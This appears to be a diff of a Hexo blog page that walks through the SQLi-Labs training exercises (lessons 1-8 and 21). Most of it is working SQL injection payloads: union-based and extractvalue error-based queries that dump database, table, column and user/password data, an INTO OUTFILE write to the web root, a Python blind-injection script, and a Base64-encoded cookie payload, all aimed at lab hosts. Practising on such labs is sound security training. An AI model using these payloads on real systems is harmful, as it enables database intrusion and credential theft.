@@ -18,14 +18,25 @@
   
   
   <title>sqli_labs通关 | Hexo</title>
-  <meta name="description" content="sqlisqli-less-1123&#x27;闭合爆库：http:&#x2F;&#x2F;192.168.2.25&#x2F;sqli&#x2F;Less-1&#x2F;?%20id&#x3D;-1%27%20union%20select%201,database(),3%20--+   sqli-less-21    sqli-less-21123使用yakit抓包对YWRtaW4&#x3D;进行解码发现是Base编码&#x27;)闭合  1234爆库：admi">
+  <meta name="description" content="sqlisqli-less-1123&#x27;闭合爆库：http:&#x2F;&#x2F;192.168.2.25&#x2F;sqli&#x2F;Less-1&#x2F;?%20id&#x3D;-1%27%20union%20select%201,database(),3%20--+   sqli-less-2123源码执行语句：$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;数字型">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli_labs通关">
 <meta property="og:url" content="http://example.com/2023/12/26/sqli_labs%E9%80%9A%E5%85%B3/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="sqlisqli-less-1123&#x27;闭合爆库：http:&#x2F;&#x2F;192.168.2.25&#x2F;sqli&#x2F;Less-1&#x2F;?%20id&#x3D;-1%27%20union%20select%201,database(),3%20--+   sqli-less-21    sqli-less-21123使用yakit抓包对YWRtaW4&#x3D;进行解码发现是Base编码&#x27;)闭合  1234爆库：admi">
+<meta property="og:description" content="sqlisqli-less-1123&#x27;闭合爆库：http:&#x2F;&#x2F;192.168.2.25&#x2F;sqli&#x2F;Less-1&#x2F;?%20id&#x3D;-1%27%20union%20select%201,database(),3%20--+   sqli-less-2123源码执行语句：$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;数字型">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240103215440206.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105143550582.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105143814968.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105143936228.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231224091358053.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231224091821091.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231224092609233.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231224094638888.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105144413012.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105160617089.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105160654356.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231225111738144.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227113135468.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227105831548.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226215144993.png">
@@ -60,7 +71,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227205143686.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227205109664.png">
 <meta property="article:published_time" content="2023-12-26T09:14:39.000Z">
-<meta property="article:modified_time" content="2024-01-03T14:07:05.776Z">
+<meta property="article:modified_time" content="2024-01-05T08:16:29.153Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240103215440206.png">
@@ -394,10 +405,41 @@
         <h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><h4 id="sqli-less-1"><a href="#sqli-less-1" class="headerlink" title="sqli-less-1"></a>sqli-less-1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;闭合</span><br><span class="line">爆库：</span><br><span class="line">http://192.168.2.25/sqli/Less-1/?%20id=-1%27%20union%20select%201,database(),3%20--+</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240103215440206.png" alt="image-20240103215440206"></p>
-<h4 id="sqli-less-2"><a href="#sqli-less-2" class="headerlink" title="sqli-less-2"></a>sqli-less-2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="sqli-less-2"><a href="#sqli-less-2" class="headerlink" title="sqli-less-2"></a>sqli-less-2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源码执行语句：$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">数字型</span><br><span class="line">爆库：http://192.168.2.25/sqli/Less-2/?%20id=-1%20union%20select%201,database(),3%20--+</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105143550582.png" alt="image-20240105143550582"></p>
+<h4 id="sqli-less-3"><a href="#sqli-less-3" class="headerlink" title="sqli-less-3"></a>sqli-less-3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)闭合</span><br><span class="line">爆库：http://192.168.2.25/sqli/Less-3/?%20id=-1%27)%20union%20select%201,database(),3%20--+</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105143814968.png" alt="image-20240105143814968"></p>
+<h4 id="sqli-less-4"><a href="#sqli-less-4" class="headerlink" title="sqli-less-4"></a>sqli-less-4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;)闭合</span><br><span class="line">爆库：http://192.168.2.25/sqli/Less-4/?%20id=-1%22)%20union%20select%201,database(),3%20--+</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105143936228.png" alt="image-20240105143936228"></p>
+<h4 id="sqli-less-5"><a href="#sqli-less-5" class="headerlink" title="sqli-less-5"></a>sqli-less-5</h4><p>爆库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-5/?%20id=1&#x27; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231224091358053.png" alt="image-20231224091358053"></p>
+<p>爆表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-5/?%20id=1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231224091821091.png" alt="image-20231224091821091"></p>
+<p>爆字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-5/?%20id=1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231224092609233.png" alt="image-20231224092609233"></p>
+<p>爆数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-5/?%20id=1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231224094638888.png" alt="image-20231224094638888"></p>
+<h4 id="sqli-less-6"><a href="#sqli-less-6" class="headerlink" title="sqli-less-6"></a>sqli-less-6</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;闭合，字符型</span><br><span class="line">报错注入</span><br><span class="line">爆库：http://192.168.2.25/sqli/Less-6/?%20id=1%22%20and%20(extractvalue(1,concat(0x7e,(select%20database()),0x7e)))--%20-</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105144413012.png" alt="image-20240105144413012"></p>
+<h4 id="sqli-less-7"><a href="#sqli-less-7" class="headerlink" title="sqli-less-7"></a>sqli-less-7</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">&#x27;))闭合</span><br><span class="line">爆库：http://192.168.2.25/sqli/Less-7/?id=1&#x27;)) union select 1,database(),3 into outfile &quot;D:\\Software\\phpstudy\\phpstudy_pro\\WWW\\1.txt&quot; -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105160617089.png" alt="image-20240105160617089"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240105160654356.png" alt="image-20240105160654356"></p>
+<h4 id="sqli-less-8"><a href="#sqli-less-8" class="headerlink" title="sqli-less-8"></a>sqli-less-8</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># sqli_8</span><br><span class="line"># 盲注  Get请求</span><br><span class="line"># 1.爆库</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">def erfen(url):</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    for i in range(1, 101):</span><br><span class="line">        a = 32</span><br><span class="line">        b = 128</span><br><span class="line">        d = (a + b) // 2</span><br><span class="line">        while a &lt; b:</span><br><span class="line">            Get = url + &quot;/**/and/**/ascii(substr(database(), &#123;0&#125;, 1))&gt;&#123;1&#125;-- -&quot;.format(i, d)</span><br><span class="line">            res = session.get(Get)</span><br><span class="line">            if &#x27;You are in...........&#x27; in res.text:</span><br><span class="line">                a = d + 1</span><br><span class="line">                d = (a + b) // 2</span><br><span class="line">            else:</span><br><span class="line">                b = d</span><br><span class="line">                d = (a + b) // 2</span><br><span class="line">        if d == 32:</span><br><span class="line">            break</span><br><span class="line">        name += chr(d)</span><br><span class="line">        print(name)</span><br><span class="line"></span><br><span class="line">    # return name  # 注释掉，直接输出数据库名称，没有过程</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &quot;http://192.168.2.56/sqli/Less-8/?id=1&#x27;&quot;</span><br><span class="line">    # url = &quot;http://192.168.2.56/sqli/Less-26a/?id=1&#x27;)&quot;</span><br><span class="line">    name = erfen(url)</span><br><span class="line">    # print(name)  # 注释掉，直接输出数据库名称，没有过程</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231225111738144.png" alt="img"></p>
 <h4 id="sqli-less-21"><a href="#sqli-less-21" class="headerlink" title="sqli-less-21"></a>sqli-less-21</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用yakit抓包</span><br><span class="line">对YWRtaW4=进行解码发现是Base编码</span><br><span class="line">&#x27;)闭合</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆库：</span><br><span class="line">admin&#x27;)and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</span><br><span class="line">Base编码</span><br><span class="line">YWRtaW4nKWFuZCAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkpLS0gLQ==</span><br></pre></td></tr></table></figure>
